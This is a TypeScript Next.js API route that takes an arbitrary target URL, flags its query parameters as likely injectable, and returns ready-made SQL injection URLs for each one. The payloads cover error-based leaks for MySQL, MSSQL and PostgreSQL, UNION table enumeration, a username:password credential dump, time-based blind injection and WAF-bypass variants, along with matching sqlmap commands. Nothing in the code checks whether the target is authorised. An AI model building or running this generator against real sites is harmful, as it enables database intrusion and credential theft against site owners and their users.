import { NextRequest, NextResponse } from "next/server";

type Risk = "low" | "medium" | "high" | "critical";

interface InjectedURL {
  label: string;
  technique: string;
  dbms: string;
  risk: Risk;
  originalParam: string;
  payload: string;
  injectedUrl: string;
  sqlmapCmd: string;
  description: string;
}

interface ParamAnalysis {
  name: string;
  value: string;
  type: "numeric" | "string" | "boolean" | "unknown";
  injectable: boolean;
  reason: string;
}

function detectParamType(value: string): "numeric" | "string" | "boolean" | "unknown" {
  if (/^\d+$/.test(value)) return "numeric";
  if (/^(true|false|0|1|yes|no)$/i.test(value)) return "boolean";
  if (value.length > 0) return "string";
  return "unknown";
}

function analyzeParams(url: URL): ParamAnalysis[] {
  const results: ParamAnalysis[] = [];

  url.searchParams.forEach((value, name) => {
    const type = detectParamType(value);
    const injectable =
      type === "numeric" ||
      type === "string" ||
      ["id", "user", "uid", "pid", "cat", "category", "page", "item",
       "product", "search", "q", "query", "name", "username", "email",
       "order", "sort", "filter", "type", "action", "view", "file",
       "path", "dir", "lang", "ref", "token", "code"].includes(name.toLowerCase());

    results.push({
      name,
      value,
      type,
      injectable,
      reason: injectable
        ? type === "numeric"
          ? "Numeric parameter — high SQLi probability"
          : `Parameter name "${name}" commonly vulnerable to SQLi`
        : "Low SQLi probability for this parameter",
    });
  });

  return results;
}

function buildInjectedURL(baseUrl: URL, paramName: string, payload: string): string {
  const url = new URL(baseUrl.toString());
  url.searchParams.set(paramName, payload);
  return url.toString();
}

function generateURLPayloads(
  baseUrl: URL,
  param: ParamAnalysis
): InjectedURL[] {
  const p = param.name;
  const isNumeric = param.type === "numeric";
  const quote = isNumeric ? "" : "'";

  const payloads: Omit<InjectedURL, "injectedUrl" | "sqlmapCmd">[] = [
    // ── Detection ──────────────────────────────────────────────
    {
      label: "Basic quote test",
      technique: "Detection",
      dbms: "All",
      risk: "low",
      originalParam: p,
      payload: `${param.value}${quote}'`,
      description: "Trigger syntax error to confirm SQLi entry point",
    },
    {
      label: "Boolean true",
      technique: "Detection",
      dbms: "All",
      risk: "low",
      originalParam: p,
      payload: isNumeric ? `${param.value} AND 1=1` : `${param.value}' AND '1'='1`,
      description: "Always-true condition — compare with false variant",
    },
    {
      label: "Boolean false",
      technique: "Detection",
      dbms: "All",
      risk: "low",
      originalParam: p,
      payload: isNumeric ? `${param.value} AND 1=2` : `${param.value}' AND '1'='2`,
      description: "Always-false condition — different response = confirmed SQLi",
    },

    // ── Error-Based ─────────────────────────────────────────────
    {
      label: "MySQL extractvalue",
      technique: "Error-Based",
      dbms: "MySQL",
      risk: "high",
      originalParam: p,
      payload: `${param.value}${quote} AND extractvalue(1,concat(0x7e,database()))--`,
      description: "Leak current database name via XML error",
    },
    {
      label: "MySQL updatexml",
      technique: "Error-Based",
      dbms: "MySQL",
      risk: "high",
      originalParam: p,
      payload: `${param.value}${quote} AND updatexml(1,concat(0x7e,(SELECT version())),1)--`,
      description: "Leak MySQL version via updatexml error",
    },
    {
      label: "MSSQL convert",
      technique: "Error-Based",
      dbms: "MSSQL",
      risk: "high",
      originalParam: p,
      payload: `${param.value}${quote} AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--`,
      description: "Leak table names via MSSQL conversion error",
    },
    {
      label: "PostgreSQL cast",
      technique: "Error-Based",
      dbms: "PostgreSQL",
      risk: "high",
      originalParam: p,
      payload: `${param.value}${quote} AND CAST((SELECT version()) AS int)--`,
      description: "Leak PostgreSQL version via cast error",
    },

    // ── UNION-Based ─────────────────────────────────────────────
    {
      label: "UNION column probe (2)",
      technique: "UNION",
      dbms: "MySQL/MSSQL",
      risk: "medium",
      originalParam: p,
      payload: `${param.value}${quote} UNION SELECT NULL,NULL--`,
      description: "Probe for 2-column UNION — adjust NULLs to match",
    },
    {
      label: "UNION column probe (3)",
      technique: "UNION",
      dbms: "MySQL/MSSQL",
      risk: "medium",
      originalParam: p,
      payload: `${param.value}${quote} UNION SELECT NULL,NULL,NULL--`,
      description: "Probe for 3-column UNION",
    },
    {
      label: "UNION DB version",
      technique: "UNION",
      dbms: "MySQL",
      risk: "high",
      originalParam: p,
      payload: `${param.value}${quote} UNION SELECT NULL,@@version,NULL--`,
      description: "Extract MySQL version via UNION",
    },
    {
      label: "UNION table enum",
      technique: "UNION",
      dbms: "MySQL",
      risk: "high",
      originalParam: p,
      payload: `${param.value}${quote} UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--`,
      description: "List all tables in current database",
    },
    {
      label: "UNION credential dump",
      technique: "UNION",
      dbms: "MySQL",
      risk: "critical",
      originalParam: p,
      payload: `${param.value}${quote} UNION SELECT NULL,concat(username,0x3a,password),NULL FROM users--`,
      description: "Dump username:password — adjust table/column names",
    },

    // ── Time-Based ──────────────────────────────────────────────
    {
      label: "MySQL SLEEP(5)",
      technique: "Time-Based",
      dbms: "MySQL",
      risk: "medium",
      originalParam: p,
      payload: `${param.value}${quote} AND SLEEP(5)--`,
      description: "5-second delay confirms blind SQLi on MySQL",
    },
    {
      label: "MySQL conditional SLEEP",
      technique: "Time-Based",
      dbms: "MySQL",
      risk: "high",
      originalParam: p,
      payload: `${param.value}${quote} AND IF(1=1,SLEEP(5),0)--`,
      description: "Conditional sleep — exploitable for data extraction",
    },
    {
      label: "MSSQL WAITFOR",
      technique: "Time-Based",
      dbms: "MSSQL",
      risk: "medium",
      originalParam: p,
      payload: `${param.value}${quote}; WAITFOR DELAY '0:0:5'--`,
      description: "MSSQL 5-second delay via stacked query",
    },
    {
      label: "PostgreSQL pg_sleep",
      technique: "Time-Based",
      dbms: "PostgreSQL",
      risk: "medium",
      originalParam: p,
      payload: `${param.value}${quote}; SELECT pg_sleep(5)--`,
      description: "PostgreSQL 5-second delay",
    },

    // ── WAF Bypass ──────────────────────────────────────────────
    {
      label: "Comment fragmentation",
      technique: "WAF Bypass",
      dbms: "MySQL",
      risk: "high",
      originalParam: p,
      payload: `${param.value}${quote} UN/**/ION SE/**/LECT NULL,database(),NULL--`,
      description: "Inline comments break WAF keyword detection",
    },
    {
      label: "Case variation UNION",
      technique: "WAF Bypass",
      dbms: "MySQL",
      risk: "high",
      originalParam: p,
      payload: `${param.value}${quote} uNiOn SeLeCt NULL,@@version,NULL--`,
      description: "Mixed case to bypass case-sensitive WAF rules",
    },
    {
      label: "Tab whitespace bypass",
      technique: "WAF Bypass",
      dbms: "MySQL",
      risk: "high",
      originalParam: p,
      payload: `${param.value}${quote}%09OR%091=1--`,
      description: "Tab chars instead of spaces — bypass space filtering",
    },

    // ── SQLMap Commands ──────────────────────────────────────────
    {
      label: "SQLMap auto-detect",
      technique: "Automation",
      dbms: "All",
      risk: "high",
      originalParam: p,
      payload: `[sqlmap command — see injectedUrl]`,
      description: "Full sqlmap automated scan on this parameter",
    },
  ];

  return payloads.map((entry) => {
    const injectedUrl =
      entry.technique === "Automation"
        ? baseUrl.toString()
        : buildInjectedURL(baseUrl, p, entry.payload);

    const sqlmapCmd =
      entry.technique === "Automation"
        ? `sqlmap -u "${baseUrl.toString()}" -p ${p} --dbs --batch --level=3 --risk=2`
        : `sqlmap -u "${injectedUrl}" -p ${p} --technique=${entry.technique === "Time-Based" ? "T" : entry.technique === "UNION" ? "U" : entry.technique === "Error-Based" ? "E" : "B"} --batch`;

    return { ...entry, injectedUrl, sqlmapCmd };
  });
}

export async function GET(req: NextRequest) {
  const rawUrl = req.nextUrl.searchParams.get("q");
  if (!rawUrl) {
    return NextResponse.json({ error: "URL parameter required" }, { status: 400 });
  }

  // Normalize URL
  let targetUrl: URL;
  try {
    const normalized = rawUrl.startsWith("http") ? rawUrl : `https://${rawUrl}`;
    targetUrl = new URL(normalized);
  } catch {
    return NextResponse.json({ error: "Invalid URL format" }, { status: 400 });
  }

  if (targetUrl.searchParams.size === 0) {
    return NextResponse.json({
      error: "No query parameters found in URL. Example: https://target.com/page?id=1",
      hint: "SQLi URL analysis requires at least one URL parameter (e.g. ?id=1, ?search=test)",
    }, { status: 400 });
  }

  const params = analyzeParams(targetUrl);
  const injectableParams = params.filter((p) => p.injectable);

  const results: Record<string, InjectedURL[]> = {};
  for (const param of injectableParams) {
    results[param.name] = generateURLPayloads(targetUrl, param);
  }

  return NextResponse.json({
    originalUrl: targetUrl.toString(),
    host: targetUrl.hostname,
    path: targetUrl.pathname,
    totalParams: params.length,
    injectableCount: injectableParams.length,
    params,
    results,
    timestamp: new Date().toISOString(),
  });
}
